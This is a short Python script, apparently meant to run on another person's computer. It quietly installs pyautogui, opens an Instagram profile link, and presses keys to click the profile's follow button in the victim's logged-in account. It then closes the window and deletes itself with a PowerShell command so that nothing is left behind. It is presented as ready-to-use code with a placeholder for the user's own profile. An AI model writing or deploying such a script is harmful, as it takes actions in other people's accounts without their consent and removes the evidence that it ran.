import os
import sys
import subprocess
import time
import webbrowser

def install_package(package_name):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])

def delete_self():
    script_path = os.path.abspath(sys.argv[0])
    cmd = f'powershell Remove-Item "{script_path}" -Force'
    subprocess.Popen(cmd, shell=True)

try:
    try:
        import pyautogui
    except ImportError:
        install_package("pyautogui")
        import pyautogui

#Replace this link with a link to your profile!
    INSTAGRAM_LINK = 'https://www.instagram.com/YOUR_PROFILE'

    webbrowser.open(INSTAGRAM_LINK)
    # depending on your targets connection you may need to increase the time to sleep.
    # simply replace 'time.sleep(5' with 'time.sleep(15)'
    time.sleep(5)

    for _ in range(13):
        pyautogui.press('tab')
        time.sleep(0.5)

    pyautogui.press('enter')
    time.sleep(3)
    pyautogui.hotkey('alt', 'f4')
    time.sleep(3)
    
except Exception as e:
    delete_self()
    sys.exit(1)

delete_self()
